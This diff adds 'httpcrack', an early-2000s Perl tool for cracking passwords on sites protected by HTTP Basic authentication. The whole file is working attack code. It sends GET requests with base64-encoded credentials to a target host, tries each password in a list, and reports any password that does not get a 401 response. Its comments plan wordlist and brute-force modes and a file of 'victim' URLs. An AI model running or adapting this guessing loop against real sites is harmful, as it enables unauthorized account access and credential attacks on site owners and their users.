@@ -1,0 +1,65 @@
+#!/usr/bin/perl
+# httpcrack v.0.0.1
+# (C)opyright 2003, SodaPhish <sodaphish@securitylounge.com>, all rights reserved.
+# 
+# http://sodaphish.com
+#
+# `httpcrack` is a purpose built password cracker for HTTP/1.0 "Basic" authorization 
+# protected sites.  It is simple, relatively fast, and effective.
+#
+# last modified: May 5, 2003
+#
+# todo:
+#	- add support for wordlist files (v.0.1.0
+#	- improve command-line option passing (v.0.1.0)
+#	- have output to file (v.0.1.0)
+# 	- support brute-force mode cracking (v.0.2.0)
+#	- show statistics on attempts per second, etc. (v.0.2.0)
+#	- support 'victim file' that lists URL's to crack (v.0.3.0)
+# 	- possibily eliminate building the socket on EVERY password attempt (v.0.?.?)
+use strict;
+use IO::Socket;
+use MIME::Base64;
+
+
+
+# change this info to find the key size.
+my $username = "victimuser"; 
+my $hostname = "example.com";
+my $path = "/path/to/protected/resources"; 
+# add potential passwords here.
+my @passlist = ( '', "badpass", "anotherpass", "nullpass" );
+
+
+
+foreach( @passlist )
+{
+	if( check_pass( "$hostname", "$path", encode_base64( "$username:$_" ) ) !~ /401/ )
+	{
+			print "$_ worked!\n";
+			exit;
+	}
+}
+print "nothing seems to have worked, dying.\n";
+
+
+sub check_pass 
+{
+	my( $host, $path, $authstring ) = @_; 
+	$path = "/" if( $path eq "" );
+
+	my $request = "GET $path HTTP/1.0\r\n" .
+		"Authorization: Basic $authstring\r\n" .
+		"\r\n\r\n"; 
+	my $r_sock = IO::Socket::INET->new( Proto=>"tcp", PeerAddr=>$host, PeerPort=>80 ) 
+		or die( "Couldn't bind to remote host! $!" ); 
+	#$r_sock->autoflush( 1 );
+	print $r_sock $request; 
+
+	my $result = <$r_sock>;
+	$result =~ /HTTP\S+\s(\d+)/;
+	$result = $1; 
+	close $r_sock; 
+
+	return $result; 
+}
